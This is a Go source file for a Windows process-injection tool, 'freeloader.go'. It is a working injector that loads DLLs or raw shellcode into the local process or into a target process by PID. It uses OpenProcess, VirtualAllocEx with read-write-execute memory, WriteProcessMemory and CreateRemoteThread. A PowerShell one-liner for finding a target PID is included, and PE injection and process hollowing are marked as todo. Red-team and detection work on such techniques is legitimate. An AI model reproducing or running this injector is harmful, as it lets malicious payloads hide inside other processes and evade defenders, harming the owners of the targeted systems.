package main

/*  @saulpanders
*	freeloader.go: General purpose DLL, PE & Shellcode injection
*	inspired by syringe: https://github.com/securestate/syringe
*	using https://github.com/golang/go/wiki/WindowsDLLs for "pinvoke" help

	implement dll injection (local & remote process) - use loadlibrary
		todo: reflection
	implement shellcode injection (local & remote process) - done (uses createthread/createremotethread with RWX)
	implement pe injection (remote process)
		todo: implement pe injection & process hollowing

	powershell to hunt for PID:

	foreach ($p in $(ps)) { if ($p.Name -eq "notepad"){$p}}
*/

import (
	"flag"
	"fmt"
	"io/ioutil"
	"syscall"
	"unsafe"
)

func abort(funcname string, err error) {
	panic(fmt.Sprintf("%s failed: %v", funcname, err))
}

var (
	ntdll, _           = syscall.LoadLibrary("ntdll.dll")
	kernel32, _        = syscall.LoadLibrary("kernel32.dll")
	getModuleHandle, _ = syscall.GetProcAddress(kernel32, "GetModuleHandleW")

	openProcess, _    = syscall.GetProcAddress(kernel32, "OpenProcess")
	getProcAddress, _ = syscall.GetProcAddress(kernel32, "GetProcAddress")
	loadLibraryA, _   = syscall.GetProcAddress(kernel32, "LoadLibraryA")

	virtualAlloc, _       = syscall.GetProcAddress(kernel32, "VirtualAlloc")
	virtualAllocEx, _     = syscall.GetProcAddress(kernel32, "VirtualAllocEx")
	writeProcessMemory, _ = syscall.GetProcAddress(kernel32, "WriteProcessMemory")
	rtlCopyMemory, _      = syscall.GetProcAddress(ntdll, "RtlCopyMemory")

	createRemoteThread, _ = syscall.GetProcAddress(kernel32, "CreateRemoteThread")
	createThread, _       = syscall.GetProcAddress(kernel32, "CreateThread")

	closeHandle, _         = syscall.GetProcAddress(kernel32, "CloseHandle")
	waitForSingleObject, _ = syscall.GetProcAddress(kernel32, "WaitForSingleObject")

	/*
		VirtualFree
	*/
)

const (
	PROCESS_CREATE_THREAD     = 0x0080
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_READ           = 0x0010
	PROCESS_VM_WRITE          = 0x0020

	CREATE_THREAD_ACCESS = (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

	MEM_COMMIT  = 0x00001000
	MEM_RESERVE = 0x00002000

	MEM_PERMISSIONS = (MEM_COMMIT | MEM_RESERVE)

	PAGE_READWRITE         = 0x04
	PAGE_EXECUTE_READWRITE = 0x40
)

//"Pinvoke" definitions

func GetModuleHandle() (handle uintptr) {
	var nargs uintptr = 0
	if ret, _, callErr := syscall.Syscall(uintptr(getModuleHandle), nargs, 0, 0, 0); callErr != 0 {
		abort("Call GetModuleHandle", callErr)
	} else {
		handle = ret
	}
	return
}

//function syscall wrapping
//openprocess
func OpenProcess(access uintptr, inhereth uintptr, pid uintptr) (handle uintptr) {
	var nargs uintptr = 3
	if ret, _, callErr := syscall.Syscall(uintptr(openProcess), nargs, access, inhereth, pid); callErr != 0 {
		abort("[!] Call OpenProcess", callErr)
	} else {
		handle = ret
	}
	return
}

//RtlCopyMemory
func RtlCopyMemory(destination uintptr, source uintptr, size int) (address uintptr) {
	var nargs uintptr = 3
	if ret, _, callErr := syscall.Syscall(uintptr(rtlCopyMemory), nargs, destination, source, uintptr(size)); callErr != 0 {
		abort("[!] Call RtlCopyMemory", callErr)
	} else {
		address = ret
	}
	return
}

//virtualAlloc
func VirtualAlloc(lpAddress uintptr, size int, flAllocationType int, flProtect int, extra uintptr, extra2 uintptr) (address uintptr) {
	var nargs uintptr = 4
	if ret, _, callErr := syscall.Syscall6(uintptr(virtualAlloc), nargs, lpAddress, uintptr(size), uintptr(flAllocationType), uintptr(flProtect), extra, extra2); callErr != 0 {
		abort("[!] Call VirtualAlloc", callErr)
	} else {
		address = ret
	}
	return
}

//virtualAllocEx
func VirtualAllocEx(hProc uintptr, lpAddress uintptr, size int, flAllocationType int, flProtect int, extra uintptr) (address uintptr) {
	var nargs uintptr = 5
	if ret, _, callErr := syscall.Syscall6(uintptr(virtualAllocEx), nargs, uintptr(hProc), uintptr(lpAddress), uintptr(size), uintptr(flAllocationType), uintptr(flProtect), extra); callErr != 0 {
		abort("[!] Call VirtualAllocEx", callErr)
	} else {
		address = ret
	}
	return
}

//WriteProcessMemory
func WriteProcessMemory(hProc uintptr, lpBaseAddress uintptr, lpBuffer uintptr, size int, lpNumBytesWrote int, extra uintptr) (success uintptr) {
	var nargs uintptr = 5
	if ret, _, callErr := syscall.Syscall6(uintptr(writeProcessMemory), nargs, uintptr(hProc), uintptr(lpBaseAddress), uintptr(lpBuffer), uintptr(size), uintptr(lpNumBytesWrote), extra); callErr != 0 {
		abort("[!] Call WriteProcessMemory", callErr)
	} else {
		success = ret
	}
	return
}

//CreateThread
func CreateThread(lpSecurityAttributes uintptr, size int, lpStartAddress uintptr, lpParameter uintptr, flags int, extra uintptr) (handle uintptr) {
	var nargs uintptr = 5
	if ret, _, callErr := syscall.Syscall6(uintptr(createThread), nargs, lpSecurityAttributes, uintptr(size), lpStartAddress, lpParameter, uintptr(flags), extra); callErr != 0 {
		abort("[!] Call CreateThread", callErr)
	} else {
		handle = ret
	}
	return
}

//CreateRemoteThread
func CreateRemoteThread(hProc uintptr, lpSecurityAttributes uintptr, size int, lpStartAddress uintptr, lpParameter uintptr, flags int) (handle uintptr) {
	var nargs uintptr = 6
	if ret, _, callErr := syscall.Syscall6(uintptr(createRemoteThread), nargs, hProc, lpSecurityAttributes, uintptr(size), lpStartAddress, lpParameter, uintptr(flags)); callErr != 0 {
		abort("[!] Call CreateRemoteThread", callErr)
	} else {
		handle = ret
	}
	return
}

func CloseHandle(handle uintptr, extra1 uintptr, extra2 uintptr) (success uintptr) {
	var nargs uintptr = 1
	if ret, _, callErr := syscall.Syscall(uintptr(closeHandle), nargs, handle, extra1, extra2); callErr != 0 {
		abort("[!] Call CloseHandle", callErr)
	} else {
		success = ret
	}
	return
}
func WaitForSingleObject(hThread uintptr, timeout int, extra uintptr) (success uintptr) {
	var nargs uintptr = 2
	if ret, _, callErr := syscall.Syscall(uintptr(waitForSingleObject), nargs, hThread, uintptr(timeout), extra); callErr != 0 {
		abort("[!] Call WaitForSingleObject", callErr)
	} else {
		success = ret
	}
	return
}

// INJECTORS: core logic
func InjectDLL(pDll string, dwProcessID int) {

	//todo: add more granular checks for success after each function call; figure out why createremotethread does not exit gracefully

	var hProc uintptr
	//var hRemoteThread uintptr
	var pRemoteBuff uintptr
	//var pLoadLibraryAddr uintptr

	db := []byte(pDll)
	//get handle to target proc

	hProc = OpenProcess(CREATE_THREAD_ACCESS, 0, uintptr(dwProcessID))

	//allocate space in target
	pRemoteBuff = VirtualAllocEx(hProc, 0, len(pDll), MEM_PERMISSIONS, PAGE_READWRITE, 0)

	//write DLL to allocated memory
	_ = WriteProcessMemory(hProc, pRemoteBuff, uintptr(unsafe.Pointer(&db[0])), len(pDll), 0, 0)

	//execute with createremotethreadex
	_ = CreateRemoteThread(hProc, 0, 0, loadLibraryA, pRemoteBuff, 0)

	//close handle to target proc
	_ = CloseHandle(hProc, 0, 0)

}

//working local DLL injection!
func LoadDLL(pDll string) {

	_, errLoadLibrary := syscall.LoadLibrary(pDll)
	if errLoadLibrary != nil {
		abort("[!] Call LoadLibrary", errLoadLibrary)
	}
}

//working remote shellcode injection!
func InjectShellcode(shellcode []byte, dwProcessID int) {
	//todo: add more granular checks for success after each function call; figure out why createremotethread does not exit gracefully

	var hProc uintptr
	var pRemoteBuff uintptr

	hProc = OpenProcess(CREATE_THREAD_ACCESS, 0, uintptr(dwProcessID))

	//allocate space in target
	pRemoteBuff = VirtualAllocEx(hProc, 0, len(shellcode), MEM_PERMISSIONS, PAGE_EXECUTE_READWRITE, 0)

	//write DLL to allocated memory
	_ = WriteProcessMemory(hProc, pRemoteBuff, uintptr(unsafe.Pointer(&shellcode[0])), len(shellcode), 0, 0)

	//execute with createremotethreadex
	_ = CreateRemoteThread(hProc, 0, 0, pRemoteBuff, 0, 0)

	//close handle to target proc
	_ = CloseHandle(hProc, 0, 0)
}

// working local shellcode injection!
func ExecuteShellcode(shellcode []byte) {

	pBuff := VirtualAlloc(0, len(shellcode), MEM_PERMISSIONS, PAGE_EXECUTE_READWRITE, 0, 0)
	_ = RtlCopyMemory(pBuff, (uintptr)(unsafe.Pointer(&shellcode[0])), len(shellcode))
	hThread := CreateThread(0, 0, pBuff, 0, 0, 0)
	event := WaitForSingleObject(hThread, 0xFFFFFFFF, 0)
	fmt.Println(fmt.Sprintf("[+]WaitForSingleObject returned with %d", event))

}

func InjectPE(pPE string, dwProcessID int) {
	fmt.Println("todo")
}

func HollowPE(pPE string, dwProcessID int) {
	fmt.Println("todo")
}

//main etc.
func main() {
	defer syscall.FreeLibrary(kernel32)

	//rethink argument parsing - need conditional branching + help with OS path for args?

	file := flag.String("file", "test.dll", "path to file for injection (.dll/.bin)")
	technique := flag.String("technique", "dll", "technique for injection (dll/exe/shellcode)")
	pid := flag.Int("pid", 0, "Process ID to inject into")
	flag.Parse()
	fmt.Println(pid)

	data, _ := ioutil.ReadFile(*file)

	if *technique == "dll" {
		if *pid == 0 {
			LoadDLL(*file)
		} else {
			InjectDLL(*file, *pid)
		}
	} else if *technique == "shellcode" {
		if *pid == 0 {
			ExecuteShellcode(data)
		} else {
			InjectShellcode(data, *pid)
		}
	} else if *technique == "pe" {
		fmt.Println("todo")
	} else {
		fmt.Println("[!!] Error: technique must be dll, shellcode, or pe")
	}

	//InjectShellcode(data, *pid)
	//ExecuteShellcode(data)
	//LoadDLL(*dll)
	//InjectDLL(*dll, *pid)

}
